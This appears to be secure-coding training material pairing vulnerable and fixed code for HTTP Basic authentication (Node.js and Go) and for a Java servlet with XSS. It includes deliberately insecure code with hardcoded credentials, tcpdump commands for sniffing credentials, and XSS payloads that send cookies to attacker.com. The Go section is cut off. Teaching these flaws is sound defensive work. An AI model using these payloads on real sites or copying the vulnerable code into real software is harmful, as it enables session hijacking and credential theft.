Basic Authentication over HTTP is one of the most dangerous authentication patterns because credentials are transmitted in plaintext (Base64 is encoding, not encryption). This is trivially intercepted by anyone on the network path.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// DANGEROUS: Basic auth over HTTP
function basicAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="API"');
    return res.status(401).send('Authentication required');
  }

  // Base64 decode - this is NOT encryption!
  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('utf8');
  const [username, password] = credentials.split(':');

  // Direct string comparison - timing attack vulnerable
  if (username === 'admin' && password === 'secretpassword') {
    req.user = { username };
    return next();
  }

  res.status(401).send('Invalid credentials');
}

// HTTP server - credentials sent in cleartext!
app.get('/api/data', basicAuth, (req, res) => {
  res.json({ secret: 'sensitive data', user: req.user });
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
```

**Attack Payload**:
```bash
# Intercept on same network with tcpdump
sudo tcpdump -i eth0 -A port 3000 | grep -i authorization

# Output shows cleartext credentials:
# Authorization: Basic YWRtaW46c2VjcmV0cGFzc3dvcmQ=
# Decode: echo 'YWRtaW46c2VjcmV0cGFzc3dvcmQ=' | base64 -d
# Result: admin:secretpassword
```

**Why This Is Dangerous**:
- Base64 is reversible encoding, not encryption - anyone can decode it instantly
- HTTP transmits data in plaintext across every network hop (WiFi, ISP, CDN)
- Hardcoded credentials in source code get leaked via git repos
- String comparison with `===` is vulnerable to timing attacks
- No rate limiting allows unlimited brute force attempts

**SECURE VERSION**:

```javascript
const express = require('express');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const bcrypt = require('bcrypt');

const app = express();

// Secure user store (in production, use a database)
const users = new Map();

async function initUsers() {
  // Store hashed passwords, never plaintext
  const hashedPassword = await bcrypt.hash(process.env.ADMIN_PASSWORD, 12);
  users.set('admin', { passwordHash: hashedPassword, role: 'admin' });
}

// Timing-safe string comparison
function safeCompare(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) {
    crypto.timingSafeEqual(bufA, bufA); // Constant time even on length mismatch
    return false;
  }
  return crypto.timingSafeEqual(bufA, bufB);
}

async function secureBasicAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Secure API"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    const base64Credentials = authHeader.split(' ')[1];
    const credentials = Buffer.from(base64Credentials, 'base64').toString('utf8');
    const colonIndex = credentials.indexOf(':');

    if (colonIndex === -1) {
      return res.status(401).json({ error: 'Invalid credentials format' });
    }

    const username = credentials.substring(0, colonIndex);
    const password = credentials.substring(colonIndex + 1);

    const user = users.get(username);
    if (!user) {
      // Prevent username enumeration - still do bcrypt compare
      await bcrypt.compare(password, '$2b$12$invalidhashtopreventtiming');
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Secure password comparison
    const validPassword = await bcrypt.compare(password, user.passwordHash);
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    req.user = { username, role: user.role };
    next();
  } catch (error) {
    console.error('Auth error:', error.message);
    res.status(500).json({ error: 'Authentication failed' });
  }
}

app.get('/api/data', secureBasicAuth, (req, res) => {
  res.json({ data: 'sensitive information', user: req.user.username });
});

// HTTPS server - credentials encrypted in transit
const httpsOptions = {
  key: fs.readFileSync(process.env.SSL_KEY_PATH),
  cert: fs.readFileSync(process.env.SSL_CERT_PATH)
};

initUsers().then(() => {
  https.createServer(httpsOptions, app).listen(443, () => {
    console.log('Secure server running on https://localhost:443');
  });
});
```

**Key Security Controls**:
- **HTTPS encryption**: All traffic including credentials encrypted with TLS, preventing MITM attacks
- **bcrypt password hashing**: Passwords stored securely with salt, computationally expensive to crack
- **Timing-safe comparison**: Prevents attackers from inferring valid usernames via response time differences
- **Environment variables**: Credentials never hardcoded in source code

Production authentication requires multiple defense layers: rate limiting, account lockout, comprehensive logging, and support for modern authentication standards like API keys and JWT tokens.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const bcrypt = require('bcrypt');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const winston = require('winston');
const jwt = require('jsonwebtoken');

const app = express();

// Security headers
app.use(helmet({
  strictTransportSecurity: { maxAge: 31536000, includeSubDomains: true, preload: true },
  contentSecurityPolicy: { directives: { defaultSrc: ["'self'"] } }
}));

// Structured logging for security events
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: '/var/log/app/security.log' }),
    new winston.transports.Console()
  ]
});

// Rate limiting - defense against brute force
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: { error: 'Too many authentication attempts, try again later' },
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req, res) => {
    securityLogger.warn({
      event: 'rate_limit_exceeded',
      ip: req.ip,
      path: req.path,
      userAgent: req.get('User-Agent')
    });
    res.status(429).json({ error: 'Too many requests' });
  }
});

// Account lockout tracking
const failedAttempts = new Map();
const LOCKOUT_THRESHOLD = 5;
const LOCKOUT_DURATION = 30 * 60 * 1000; // 30 minutes

function isAccountLocked(username) {
  const attempts = failedAttempts.get(username);
  if (!attempts) return false;
  if (attempts.count >= LOCKOUT_THRESHOLD) {
    if (Date.now() - attempts.lastAttempt < LOCKOUT_DURATION) {
      return true;
    }
    failedAttempts.delete(username); // Reset after lockout period
  }
  return false;
}

function recordFailedAttempt(username, ip) {
  const attempts = failedAttempts.get(username) || { count: 0, lastAttempt: 0 };
  attempts.count++;
  attempts.lastAttempt = Date.now();
  failedAttempts.set(username, attempts);

  securityLogger.warn({
    event: 'failed_login',
    username,
    ip,
    attemptCount: attempts.count,
    locked: attempts.count >= LOCKOUT_THRESHOLD
  });
}

function clearFailedAttempts(username) {
  failedAttempts.delete(username);
}

// Multi-method authentication middleware
class AuthenticationManager {
  constructor() {
    this.users = new Map();
    this.apiKeys = new Map();
    this.jwtSecret = process.env.JWT_SECRET;
  }

  async initialize() {
    // Load users from secure storage
    const adminHash = await bcrypt.hash(process.env.ADMIN_PASSWORD, 12);
    this.users.set('admin', { passwordHash: adminHash, role: 'admin' });

    // API keys for service accounts
    const apiKeyHash = crypto.createHash('sha256')
      .update(process.env.SERVICE_API_KEY)
      .digest('hex');
    this.apiKeys.set(apiKeyHash, { service: 'internal-service', role: 'service' });
  }

  middleware() {
    return async (req, res, next) => {
      const startTime = Date.now();

      try {
        // Check for JWT Bearer token first
        const authHeader = req.headers.authorization;

        if (authHeader?.startsWith('Bearer ')) {
          return this.authenticateJWT(req, res, next, authHeader);
        }

        // Check for API key
        const apiKey = req.headers['x-api-key'];
        if (apiKey) {
          return this.authenticateApiKey(req, res, next, apiKey);
        }

        // Fall back to Basic Auth
        if (authHeader?.startsWith('Basic ')) {
          return this.authenticateBasic(req, res, next, authHeader);
        }

        res.setHeader('WWW-Authenticate', 'Basic realm="API", Bearer');
        return res.status(401).json({ error: 'Authentication required' });

      } catch (error) {
        securityLogger.error({
          event: 'auth_error',
          error: error.message,
          ip: req.ip,
          duration: Date.now() - startTime
        });
        return res.status(500).json({ error: 'Authentication failed' });
      }
    };
  }

  async authenticateBasic(req, res, next, authHeader) {
    const base64Credentials = authHeader.split(' ')[1];
    const credentials = Buffer.from(base64Credentials, 'base64').toString('utf8');
    const colonIndex = credentials.indexOf(':');

    if (colonIndex === -1) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const username = credentials.substring(0, colonIndex);
    const password = credentials.substring(colonIndex + 1);

    // Check account lockout
    if (isAccountLocked(username)) {
      securityLogger.warn({ event: 'locked_account_attempt', username, ip: req.ip });
      return res.status(423).json({ error: 'Account temporarily locked' });
    }

    const user = this.users.get(username);
    if (!user) {
      await bcrypt.compare(password, '$2b$12$invalidhashtopreventtiming');
      recordFailedAttempt(username, req.ip);
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const validPassword = await bcrypt.compare(password, user.passwordHash);
    if (!validPassword) {
      recordFailedAttempt(username, req.ip);
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    clearFailedAttempts(username);
    securityLogger.info({ event: 'successful_login', username, ip: req.ip, method: 'basic' });

    req.user = { username, role: user.role, authMethod: 'basic' };
    next();
  }

  authenticateApiKey(req, res, next, apiKey) {
    const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
    const service = this.apiKeys.get(keyHash);

    if (!service) {
      securityLogger.warn({ event: 'invalid_api_key', ip: req.ip });
      return res.status(401).json({ error: 'Invalid API key' });
    }

    securityLogger.info({ event: 'api_key_auth', service: service.service, ip: req.ip });
    req.user = { service: service.service, role: service.role, authMethod: 'apikey' };
    next();
  }

  authenticateJWT(req, res, next, authHeader) {
    const token = authHeader.split(' ')[1];

    try {
      const decoded = jwt.verify(token, this.jwtSecret, {
        algorithms: ['HS256'],
        maxAge: '1h'
      });

      securityLogger.info({ event: 'jwt_auth', username: decoded.sub, ip: req.ip });
      req.user = { username: decoded.sub, role: decoded.role, authMethod: 'jwt' };
      next();
    } catch (error) {
      securityLogger.warn({ event: 'invalid_jwt', error: error.message, ip: req.ip });
      return res.status(401).json({ error: 'Invalid or expired token' });
    }
  }
}

const authManager = new AuthenticationManager();

// Apply rate limiting to auth endpoints
app.use('/api', authLimiter);

// Protected routes
app.get('/api/data', authManager.middleware(), (req, res) => {
  res.json({
    data: 'sensitive information',
    user: req.user.username || req.user.service,
    authMethod: req.user.authMethod
  });
});

// Token endpoint for JWT issuance
app.post('/api/token', authLimiter, authManager.middleware(), (req, res) => {
  const token = jwt.sign(
    { sub: req.user.username, role: req.user.role },
    process.env.JWT_SECRET,
    { algorithm: 'HS256', expiresIn: '1h' }
  );
  res.json({ token, expiresIn: 3600 });
});

// Health check (no auth required)
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

// HTTPS configuration
const httpsOptions = {
  key: fs.readFileSync(process.env.SSL_KEY_PATH),
  cert: fs.readFileSync(process.env.SSL_CERT_PATH),
  minVersion: 'TLSv1.2',
  ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256'
};

authManager.initialize().then(() => {
  https.createServer(httpsOptions, app).listen(443, () => {
    securityLogger.info({ event: 'server_started', port: 443 });
  });
});
```

**Defense in Depth Layers**:

1. **Transport Layer Security**:
```javascript
// Force HTTPS and modern TLS
const httpsOptions = {
  minVersion: 'TLSv1.2',
  ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256'
};
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));
```

2. **Rate Limiting and Account Lockout**:
```javascript
// Progressive lockout increases attacker cost exponentially
const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });
if (failedAttempts >= LOCKOUT_THRESHOLD) {
  return res.status(423).json({ error: 'Account temporarily locked' });
}
```

3. **Security Event Monitoring**:
```javascript
// All auth events logged for SIEM integration
securityLogger.warn({
  event: 'failed_login',
  username,
  ip: req.ip,
  attemptCount: attempts.count,
  timestamp: new Date().toISOString()
});
```

**Additional Protections**:
- **HSTS Preloading**: Browser will never connect over HTTP, preventing SSL stripping attacks
- **API Key Hashing**: Keys stored as SHA-256 hashes, never plaintext, preventing theft from database compromise
- **JWT with Short Expiry**: Tokens expire in 1 hour, limiting exposure window if stolen
- **Constant-Time Operations**: All credential comparisons use timing-safe functions to prevent side-channel attacks
- **Username Enumeration Prevention**: Failed logins for non-existent users have identical timing to real users

Displaying user-provided content without proper encoding is extremely dangerous, especially when combined with session-based authentication. Attackers can inject JavaScript that steals session cookies, leading to complete account takeover.

**VULNERABLE CODE**:

```java
import javax.servlet.http.*;
import java.io.*;

public class ProfileServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        HttpSession session = request.getSession(false);
        if (session == null) {
            response.sendRedirect("/login");
            return;
        }

        String username = request.getParameter("name");
        String bio = request.getParameter("bio");

        response.setContentType("text/html");
        PrintWriter out = response.getWriter();

        // VULNERABLE: Direct output without encoding
        out.println("<html><body>");
        out.println("<h1>Welcome, " + username + "</h1>");
        out.println("<div class='bio'>" + bio + "</div>");
        out.println("</body></html>");
    }
}
```

**Attack Payload**:
```html
<script>new Image().src='https://attacker.com/steal?c='+document.cookie;</script>
```

Or more sophisticated:
```html
<img src=x onerror="fetch('https://attacker.com/log?cookie='+btoa(document.cookie))">
```

**Why This Is Dangerous**:
- User input is rendered directly into HTML without encoding
- Session cookies (JSESSIONID) are accessible to JavaScript by default
- Attacker receives the victim's session token and can impersonate them
- No Content Security Policy blocks inline script execution

**SECURE VERSION**:

```java
import javax.servlet.http.*;
import java.io.*;
import org.owasp.encoder.Encode;

public class ProfileServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        HttpSession session = request.getSession(false);
        if (session == null) {
            response.sendRedirect("/login");
            return;
        }

        String username = request.getParameter("name");
        String bio = request.getParameter("bio");

        // SECURE: Set HttpOnly flag on session cookie
        Cookie sessionCookie = new Cookie("JSESSIONID", session.getId());
        sessionCookie.setHttpOnly(true);
        sessionCookie.setSecure(true);
        sessionCookie.setPath("/");
        response.addCookie(sessionCookie);

        // SECURE: Add security headers
        response.setHeader("Content-Security-Policy", 
            "default-src 'self'; script-src 'self'");
        response.setHeader("X-Content-Type-Options", "nosniff");
        response.setHeader("X-XSS-Protection", "1; mode=block");

        response.setContentType("text/html; charset=UTF-8");
        PrintWriter out = response.getWriter();

        // SECURE: HTML encode all user input
        out.println("<html><body>");
        out.println("<h1>Welcome, " + Encode.forHtml(username) + "</h1>");
        out.println("<div class='bio'>" + Encode.forHtml(bio) + "</div>");
        out.println("</body></html>");
    }
}
```

**Key Security Controls**:
- **HttpOnly Cookie Flag**: Prevents JavaScript from accessing session cookies, blocking the primary XSS attack vector
- **Output Encoding**: OWASP Java Encoder converts dangerous characters like `<` to `&lt;`, preventing script injection
- **Content-Security-Policy**: Blocks inline scripts and restricts script sources to same origin
- **Secure Flag**: Ensures cookies are only transmitted over HTTPS

Allowing selective HTML requires a whitelist-based sanitization approach combined with defense-in-depth at the framework level. Here's a production-ready Spring Boot implementation with comprehensive cookie theft protection.

**PRODUCTION PATTERN**:

```java
package com.example.security;

import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;
import org.owasp.html.HtmlPolicyBuilder;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.servlet.ServletContextInitializer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.header.writers.ContentSecurityPolicyHeaderWriter;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.servlet.SessionCookieConfig;
import javax.servlet.http.HttpServletRequest;
import java.util.regex.Pattern;

@SpringBootApplication
public class SecureApplication {
    public static void main(String[] args) {
        SpringApplication.run(SecureApplication.class, args);
    }
}

@Configuration
@EnableWebSecurity
class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // Layer 1: Content Security Policy
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'nonce-{random}'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none'; " +
                        "form-action 'self'"
                    )
                )
                // Layer 2: Additional security headers
                .xssProtection(xss -> xss.block(true))
                .contentTypeOptions(cto -> {})
                .frameOptions(fo -> fo.deny())
            )
            .sessionManagement(session -> session
                .sessionFixation().migrateSession()
                .maximumSessions(1)
            );

        return http.build();
    }

    // Layer 3: Secure session cookie configuration
    @Bean
    public ServletContextInitializer servletContextInitializer() {
        return servletContext -> {
            SessionCookieConfig cookieConfig = servletContext.getSessionCookieConfig();
            cookieConfig.setHttpOnly(true);   // Blocks JavaScript access
            cookieConfig.setSecure(true);      // HTTPS only
            cookieConfig.setMaxAge(1800);      // 30 minute expiry
            cookieConfig.setName("__Host-SESSIONID"); // Cookie prefix for extra security
            cookieConfig.setAttribute("SameSite", "Strict"); // CSRF protection
        };
    }
}

@Service
class HtmlSanitizationService {

    private static final Logger logger = LoggerFactory.getLogger(HtmlSanitizationService.class);

    // Whitelist-based HTML policy - only allows safe formatting tags
    private static final PolicyFactory FORMATTING_POLICY = new HtmlPolicyBuilder()
        .allowElements("b", "i", "em", "strong", "u", "br", "p")
        .allowElements("a")
        .allowUrlProtocols("https")
        .allowAttributes("href").onElements("a")
        .requireRelNofollowOnLinks()
        .toFactory();

    // Stricter policy for sensitive contexts
    private static final PolicyFactory TEXT_ONLY_POLICY = Sanitizers.FORMATTING;

    private static final Pattern SCRIPT_PATTERN = 
        Pattern.compile("<script|javascript:|on\\w+=|<iframe|<object|<embed", 
            Pattern.CASE_INSENSITIVE);

    public String sanitizeForDisplay(String untrustedHtml, SanitizationLevel level) {
        if (untrustedHtml == null || untrustedHtml.isEmpty()) {
            return "";
        }

        // Layer 4: Pre-sanitization detection for logging
        if (SCRIPT_PATTERN.matcher(untrustedHtml).find()) {
            logger.warn("Potential XSS attempt detected in input: {}", 
                maskSensitiveContent(untrustedHtml));
        }

        // Layer 5: Whitelist-based sanitization
        String sanitized;
        switch (level) {
            case RICH_TEXT:
                sanitized = FORMATTING_POLICY.sanitize(untrustedHtml);
                break;
            case TEXT_ONLY:
            default:
                sanitized = TEXT_ONLY_POLICY.sanitize(untrustedHtml);
                break;
        }

        logger.debug("Sanitized content from {} chars to {} chars", 
            untrustedHtml.length(), sanitized.length());

        return sanitized;
    }

    private String maskSensitiveContent(String content) {
        if (content.length() > 100) {
            return content.substring(0, 100) + "...[truncated]";
        }
        return content;
    }

    public enum SanitizationLevel {
        TEXT_ONLY,
        RICH_TEXT
    }
}

@RestController
@RequestMapping("/api/profile")
class ProfileController {

    private static final Logger auditLog = LoggerFactory.getLogger("SECURITY_AUDIT");
    private final HtmlSanitizationService sanitizer;

    public ProfileController(HtmlSanitizationService sanitizer) {
        this.sanitizer = sanitizer;
    }

    @PostMapping("/update-bio")
    public ProfileResponse updateBio(
            @RequestBody BioUpdateRequest request,
            HttpServletRequest httpRequest) {

        String sessionId = httpRequest.getSession().getId();
        String clientIp = getClientIp(httpRequest);

        // Audit logging for security monitoring
        auditLog.info("Bio update attempt | session={} | ip={} | inputLength={}",
            maskSessionId(sessionId), clientIp, 
            request.getBio() != null ? request.getBio().length() : 0);

        // Sanitize with rich text allowed (bold, italic, links)
        String sanitizedBio = sanitizer.sanitizeForDisplay(
            request.getBio(), 
            HtmlSanitizationService.SanitizationLevel.RICH_TEXT
        );

        // Store sanitized content in database
        // userService.updateBio(getCurrentUserId(), sanitizedBio);

        return new ProfileResponse(true, sanitizedBio);
    }

    private String getClientIp(HttpServletRequest request) {
        String xff = request.getHeader("X-Forwarded-For");
        if (xff != null && !xff.isEmpty()) {
            return xff.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }

    private String maskSessionId(String sessionId) {
        if (sessionId == null || sessionId.length() < 8) return "invalid";
        return sessionId.substring(0, 4) + "****";
    }
}

record BioUpdateRequest(String bio) {}
record ProfileResponse(boolean success, String sanitizedBio) {}
```

**Defense in Depth Layers**:

1. **HttpOnly + Secure + SameSite Cookies**:
```java
cookieConfig.setHttpOnly(true);   // JavaScript cannot access
cookieConfig.setSecure(true);      // HTTPS transmission only
cookieConfig.setAttribute("SameSite", "Strict"); // Blocks cross-site requests
```

2. **Content Security Policy (CSP)**:
```java
"script-src 'self' 'nonce-{random}'"  // Only scripts from same origin with valid nonce
"connect-src 'self'"                   // Blocks exfiltration to external domains
```

3. **Whitelist HTML Sanitization**:
```java
new HtmlPolicyBuilder()
    .allowElements("b", "i", "em", "strong")  // Explicit whitelist
    .allowAttributes("href").onElements("a")   // Controlled attributes
    .requireRelNofollowOnLinks()                // External link safety
```

**Additional Protections**:
- **Cookie Prefix (__Host-)**: Requires Secure flag and prevents subdomain attacks
- **Session Fixation Prevention**: `migrateSession()` creates new session ID after authentication
- **Maximum Sessions**: Limits concurrent sessions to detect credential theft
- **Audit Logging**: All profile changes logged with masked session IDs for forensics
- **Input Length Tracking**: Detects abnormally large payloads that may indicate attacks
- **X-Frame-Options DENY**: Prevents clickjacking attacks that could bypass cookie protections

HTTP Basic Authentication is extremely dangerous when implemented over plain HTTP because credentials are only Base64 encoded (NOT encrypted) and can be trivially intercepted by anyone monitoring network traffic.

**VULNERABLE CODE**:

```go
package main

import (
	"encoding/base64"
	"net/http"
	"strings"
)

const (
	validUsername = "admin"
	validPassword = "secretpassword123"
)

func basicAuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		authHeader := r.Header.Get("Authorization")
		if authHeader == "" {
			w.Header().Set("WWW-Authenticate", `Basic realm="API"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// VULNERABLE: Credentials transmitted in plain text over HTTP
		payload := strings.TrimPrefix(authHeader, "Basic ")
		decoded, _ := base64.StdEncoding.DecodeString(payload)
		creds := strings.SplitN(string(decoded), ":", 2)

		// VULNERABLE: Timing attack possible with simple comparison
		if creds[0] == validUsername && creds[1] == validPassword {
			next(w, r)
			return
		}

		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
	}
}

func protectedHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Welcome to the protected API!"))
}

func main() {
	// VULNERABLE: Serving over HTTP exposes all credentials
	http.HandleFunc("/api/data", basicAuthMiddleware(protectedHandler))
	http.ListenAndServe(":8080", nil)
}
```

**Attack Payload**:
```bash
# Attacker intercepts traffic and decodes Base64 credentials
tcpdump -i eth0 -A port 8080 | grep -i authorization
# Captured: Authorization: Basic YWRtaW46c2VjcmV0cGFzc3dvcmQxMjM=
echo "YWRtaW46c2VjcmV0cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:secretpassword123
```

**Why This Is Dangerous**:
- Base64 is encoding, NOT encryption - credentials are visible to anyone sniffing traffic
- MITM attackers on the same network can intercept all authentication headers
- String comparison using `==` is vulnerable to timing attacks
- No rate limiting allows brute force attacks
- Hardcoded credentials in source code

**SECURE VERSION**:

```go
package main

import (
	"crypto/subtle"
	"crypto/tls"
	"encoding/base64"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

var limiter = rate.NewLimiter(rate.Every(time.Second), 5)

func getHashedPassword() []byte {
	// Load from environment or secure vault
	hashedPw := os.Getenv("API_PASSWORD_HASH")
	if hashedPw == "" {
		log.Fatal("API_PASSWORD_HASH environment variable not set")
	}
	return []byte(hashedPw)
}

func getUsername() string {
	username := os.Getenv("API_USERNAME")
	if username == "" {
		log.Fatal("API_USERNAME environment variable not set")
	}
	return username
}

func secureBasicAuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Rate limiting to prevent brute force
		if !limiter.Allow() {
			log.Printf("Rate limit exceeded from %s", r.RemoteAddr)
			http.Error(w, "Too many requests", http.StatusTooManyRequests)
			return
		}

		authHeader := r.Header.Get("Authorization")
		if authHeader == "" || !strings.HasPrefix(authHeader, "Basic ") {
			w.Header().Set("WWW-Authenticate", `Basic realm="Secure API"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		payload := strings.TrimPrefix(authHeader, "Basic ")
		decoded, err := base64.StdEncoding.DecodeString(payload)
		if err != nil {
			log.Printf("Invalid base64 from %s", r.RemoteAddr)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		creds := strings.SplitN(string(decoded), ":", 2)
		if len(creds) != 2 {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		// Constant-time comparison for username
		usernameValid := subtle.ConstantTimeCompare(
			[]byte(creds[0]),
			[]byte(getUsername()),
		) == 1

		// bcrypt comparison (inherently constant-time)
		passwordValid := bcrypt.CompareHashAndPassword(
			getHashedPassword(),
			[]byte(creds[1]),
		) == nil

		if usernameValid && passwordValid {
			log.Printf("Successful auth from %s", r.RemoteAddr)
			next(w, r)
			return
		}

		log.Printf("Failed auth attempt from %s", r.RemoteAddr)
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
	}
}

func protectedHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Welcome to the secure API!"))
}

func main() {
	// SECURE: TLS configuration with modern ciphers
	tlsConfig := &tls.Config{
		MinVersion:               tls.VersionTLS12,
		PreferServerCipherSuites: true,
	}

	server := &http.Server{
		Addr:         ":8443",
		TLSConfig:    tlsConfig,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	http.HandleFunc("/api/data", secureBasicAuthMiddleware(protectedHandler))

	// SECURE: Always use HTTPS
	log.Fatal(server.ListenAndServeTLS("cert.pem", "key.pem"))
}
